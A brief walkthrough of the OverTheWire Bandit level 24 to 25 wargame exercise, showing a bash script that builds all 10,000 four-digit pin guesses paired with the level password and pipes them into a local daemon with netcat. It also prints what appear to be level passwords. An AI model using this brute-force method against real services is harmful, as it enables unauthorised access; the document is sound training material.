uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

For this one, we have to brute force a 4 digit pin to get the next password.

Directions: "A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing."

I went into my `/tmp/chuck/` folder and made a script called `get_25.sh`:

```bash
#!/bin/bash
passwd=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

touch attempts

for a in {0..9}{0..9}{0..9}{0..9}
do
    echo $passwd' '$a >> attempts
done
```

I then did `chmod u+x get_25.sh` to set execution permission. This creates a file called "attempts" where each line is the password from bandit24 followed by a space followed by a 4 digit number.

Next, we pipe in the contents of `attempts` into `nc localhost 30002`:

```bash
cat attempts | nc localhost 30002
```

This brute forces until we get the next password.
